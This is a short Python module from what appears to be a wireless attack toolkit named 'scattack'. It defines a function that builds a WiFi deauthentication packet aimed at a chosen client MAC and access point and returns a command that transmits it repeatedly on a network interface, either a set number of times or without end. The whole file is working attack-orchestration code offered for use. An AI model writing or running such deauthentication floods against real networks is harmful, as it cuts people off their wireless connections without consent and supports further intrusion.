from time import sleep
from typing import Any
from scattack.core.wifi_deauth import create_deauth_packet, send_deauth_packet
from scattack.gui.command import Command, CommandId, StartCommand


def create_deauth_command(
    *,
    target_mac: str,
    ap_bssid: str,
    iface: str,
    count: int,
    interval: float,
) -> dict[str, Any]:
    def send(*args, interval: float = interval, **kwargs):
        send_deauth_packet(*args, **kwargs)
        sleep(interval)

    i = count

    def condition():
        nonlocal i
        if i == 0:
            return False
        else:
            i -= 1
            return True

    pkt = create_deauth_packet(target_mac=target_mac, ap_bssid=ap_bssid)

    return {
        "fun": send,
        "args": (pkt, iface),
        "kwargs": {"interval": interval},
        "condition": condition if count != 0 else lambda: True,
    }
